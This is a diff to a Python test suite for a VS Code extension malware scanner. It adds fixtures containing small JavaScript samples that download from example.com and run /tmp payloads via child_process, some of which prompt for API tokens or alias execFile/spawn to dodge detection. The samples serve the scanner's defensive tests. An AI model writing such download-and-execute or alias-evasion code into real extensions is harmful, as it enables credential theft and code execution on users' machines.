@@ -133,7 +133,7 @@ class ScannerTests(unittest.TestCase):
         self.assertTrue(all("detail_ref" in row for row in rows))
         suspicious = next(row for row in rows if row["extension_id"] == "unknown.shadow-helper")
         self.assertEqual(suspicious["grade"], "D")
-        self.assertEqual(suspicious["decision"], "review")
+        self.assertEqual(suspicious["decision"], "block")
         self.assertEqual(suspicious["coverage_percent"], 100)
         self.assertEqual(len(suspicious["artifact_sha256"]), 64)
         self.assertIn("credential-exfiltration-chain", suspicious["top_findings"])
@@ -1070,7 +1070,7 @@ class ScannerTests(unittest.TestCase):
             report = scan_extension(root)
 
         self.assertEqual(report.verdict, "suspicious")
-        self.assertEqual(report.decision, "review")
+        self.assertEqual(report.decision, "block")
         self.assertIn("dist/extension.js", report.analysis_coverage["analyzed_executable_files"])
 
     def test_executable_content_after_old_text_limit_is_analyzed(self) -> None:
@@ -1157,9 +1157,98 @@ class ScannerTests(unittest.TestCase):
 
         self.assertEqual(report.verdict, "suspicious")
         self.assertEqual(report.malware_authority, "non_authoritative")
+        self.assertEqual(report.decision, "block")
         self.assertGreater(report.malware_score, 0)
         self.assertGreaterEqual(report.risk_score, report.malware_score)
         self.assertIn("credential-exfiltration-chain", {finding.rule_id for finding in report.findings})
+
+    def test_standalone_download_execute_requires_review_not_block(self) -> None:
+        with TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            (root / "package.json").write_text(
+                '{"publisher":"example","name":"tool-installer","version":"1.0.0"}',
+                encoding="utf-8",
+            )
+            (root / "extension.js").write_text(
+                "const https=require('https'); const cp=require('child_process');"
+                "https.get('https://example.com/tool',()=>cp.execFile('/tmp/tool'));",
+                encoding="utf-8",
+            )
+
+            report = scan_extension(root)
+
+        self.assertEqual(report.verdict, "suspicious")
+        self.assertEqual(report.decision, "review")
+        self.assertIn("download-and-execute", {finding.rule_id for finding in report.findings})
+
+    def test_automatic_credential_aware_download_execute_is_preventively_blocked(self) -> None:
+        with TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            (root / "package.json").write_text(
+                '{"publisher":"example","name":"credential-dropper","version":"1.0.0",'
+                '"activationEvents":["*"]}',
+                encoding="utf-8",
+            )
+            (root / "extension.js").write_text(
+                "const vscode=require('vscode'); const https=require('https');"
+                "const cp=require('child_process');"
+                "vscode.window.showInputBox({prompt:'Enter API token'});"
+                "https.get('https://example.com/tool',()=>cp.execFile('/tmp/tool'));",
+                encoding="utf-8",
+            )
+
+            report = scan_extension(root)
+
+        rule_ids = {finding.rule_id for finding in report.findings}
+        self.assertEqual(report.verdict, "suspicious")
+        self.assertEqual(report.decision, "block")
+        self.assertIn("download-and-execute", rule_ids)
+        self.assertIn("credential-inputbox-prompt", rule_ids)
+        self.assertIn("broad-activation", rule_ids)
+        self.assertIn("preventive policy decision", report.decision_reason)
+
+    def test_destructured_process_alias_cannot_bypass_download_execute_chain(self) -> None:
+        with TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            (root / "package.json").write_text(
+                '{"publisher":"example","name":"aliased-dropper","version":"1.0.0",'
+                '"activationEvents":["onStartupFinished"]}',
+                encoding="utf-8",
+            )
+            (root / "extension.js").write_text(
+                "const vscode=require('vscode'); const https=require('https');"
+                "const {execFile: launch}=require('node:child_process');"
+                "vscode.window.showInputBox({prompt:'Enter access token'});"
+                "https.get('https://example.com/payload',()=>launch('/tmp/payload'));",
+                encoding="utf-8",
+            )
+
+            report = scan_extension(root)
+
+        rule_ids = {finding.rule_id for finding in report.findings}
+        self.assertEqual(report.verdict, "suspicious")
+        self.assertEqual(report.decision, "block")
+        self.assertIn("process-execution", rule_ids)
+        self.assertIn("download-and-execute", rule_ids)
+
+    def test_esm_process_alias_is_detected_without_bare_name_false_positive(self) -> None:
+        with TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            (root / "package.json").write_text(
+                '{"publisher":"example","name":"esm-installer","version":"1.0.0"}',
+                encoding="utf-8",
+            )
+            (root / "extension.js").write_text(
+                "import { spawn as launch } from 'child_process';"
+                "fetch('https://example.com/tool').then(()=>launch('/tmp/tool'));",
+                encoding="utf-8",
+            )
+
+            report = scan_extension(root)
+
+        self.assertEqual(report.verdict, "suspicious")
+        self.assertEqual(report.decision, "review")
+        self.assertIn("download-and-execute", {finding.rule_id for finding in report.findings})
 
     def test_far_apart_static_tokens_do_not_create_correlated_chain(self) -> None:
         with TemporaryDirectory() as tmp:
